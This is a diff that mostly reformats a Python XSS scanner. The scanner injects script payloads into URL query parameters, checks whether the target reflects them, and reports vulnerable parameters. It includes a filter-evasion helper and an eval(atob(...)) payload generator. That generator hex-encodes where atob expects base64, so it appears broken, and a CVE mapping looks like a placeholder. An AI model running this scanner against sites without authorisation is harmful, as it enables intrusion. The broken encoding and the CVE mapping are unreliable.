@@ -14,6 +14,7 @@ cve_mapping = {
     "eval(atob('<payload>'))": {"cve": "CVE-2021-5678", "severity": "Critical"},
 }
 
+
 def send_request(url, headers=None):
     try:
         response = requests.get(url, headers=headers, timeout=10)
@@ -21,6 +22,7 @@ def send_request(url, headers=None):
     except requests.exceptions.RequestException as e:
         print(f"[ERROR] Request failed: {e}")
         return None
+
 
 def get_website_info(url):
     """Mendapatkan informasi domain, IP address, dan firewall (jika tersedia)"""
@@ -43,25 +45,31 @@ def get_website_info(url):
         print(f"[ERROR] Failed to retrieve website information: {e}")
         return None
 
+
 def generate_obfuscated_payload(payload):
     return payload.replace("<script>", "/*<*/script/*>*/").replace("</script>", "/*<*/script/*>*/")
+
 
 def generate_random_payload():
     basic_payload = "<script>alert('XSS');</script>"
     return f"eval(atob('{basic_payload.encode('utf-8').hex()}'))"
 
+
 def get_cve_info(payload):
     """Dynamically fetch CVE and severity info for a payload."""
     return cve_mapping.get(payload, {"cve": "Unknown", "severity": "Low"})
+
 
 def test_xss(url, xss_payloads, output_file=None):
     website_info = get_website_info(url)
 
     if website_info:
         print(f"\n[INFO] Testing XSS on {Fore.CYAN}{url}{Fore.WHITE}")
-        print(f"[INFO] DOMAIN: {Fore.GREEN}{website_info['domain']}")
-        print(f"[INFO] IP ADDRESS: {Fore.GREEN}{website_info['ip_address']}")
-        print(f"[INFO] FIREWALL STATUS: {Fore.YELLOW}{website_info['firewall_info']}\n")
+        print(
+            f"[{Fore.GREEN}INFO{Fore.WHITE}] DOMAIN: {Fore.GREEN}{website_info['domain']}")
+        print(
+            f"[{Fore.GREEN}INFO{Fore.WHITE}] IP ADDRESS: {Fore.GREEN}{website_info['ip_address']}")
+        print(f"[{Fore.GREEN}INFO{Fore.WHITE}] FIREWALL STATUS: {Fore.YELLOW}{website_info['firewall_info']}\n")
 
     results = []
     vulnerable_params = {}  # Untuk menyimpan parameter rentan
@@ -81,7 +89,8 @@ def test_xss(url, xss_payloads, output_file=None):
             modified_params = {**params, param_name: [payload]}
             query_string = urlencode(modified_params, doseq=True)
             test_url = f"{base_url}?{query_string}"
-            print(f"[{Fore.BLUE}{timestamp}{Fore.WHITE}][TESTING] XSS URL: {test_url}")
+            print(
+                f"[{Fore.BLUE}{timestamp}{Fore.WHITE}][TESTING] XSS URL: {test_url}")
 
             response = send_request(test_url)
 
@@ -98,24 +107,29 @@ def test_xss(url, xss_payloads, output_file=None):
                 # Tambahkan URL rentan ke daftar
                 vulnerable_urls.append(test_url)
             else:
-                print(f"[{Fore.BLUE}{timestamp}{Fore.WHITE}]{Fore.WHITE}[SAFE - XSS] Parameter '{param_name}' did not execute payload: {payload}")
+                print(
+                    f"[{Fore.BLUE}{timestamp}{Fore.WHITE}]{Fore.WHITE}[SAFE - XSS] Parameter '{param_name}' did not execute payload: {payload}")
 
     # Tampilkan hasil akhir
     if vulnerable_params:
         print(f"\n[{Fore.GREEN}SUMMARY{Fore.WHITE}] Vulnerable parameters found:")
         for param, details in vulnerable_params.items():
-            print(f"- Parameter: '{Fore.RED}{param}{Fore.WHITE}' | Count: {Fore.RED}{details['count']}{Fore.WHITE} | Type: {Fore.RED}{details['type']}")
+            print(
+                f"- Parameter: '{Fore.RED}{param}{Fore.WHITE}' | Count: {Fore.RED}{details['count']}{Fore.WHITE} | Type: {Fore.RED}{details['type']}")
 
         print(f"\n[{Fore.GREEN}DETAIL{Fore.WHITE}] Vulnerable URLs:")
         for url in vulnerable_urls:
             print(f"[{Fore.RED}VULNERABLE - XSS{Fore.WHITE}]{Fore.RED} {url}")
     else:
-        print(f"\n[{Fore.GREEN}SUMMARY{Fore.WHITE}] No vulnerable parameters found.")
+        print(
+            f"\n[{Fore.GREEN}SUMMARY{Fore.WHITE}] No vulnerable parameters found.")
 
     if output_file:
         with open(output_file, 'a') as file:
             file.write("\n".join(results) + "\n")
-        print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [INFO] Results saved to: {output_file}")
+        print(
+            f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [INFO] Results saved to: {output_file}")
+
 
 def load_payloads(file_path):
     try:
@@ -124,6 +138,7 @@ def load_payloads(file_path):
     except FileNotFoundError:
         print("[ERROR] Payload file not found! Exiting.")
         return []
+
 
 def main():
     print(r"""
@@ -184,6 +199,7 @@ def main():
         else:
             bypassed_payloads = payloads + [generate_random_payload()]
         test_xss(url, bypassed_payloads, output_file=args.output)
+
 
 if __name__ == "__main__":
     main()
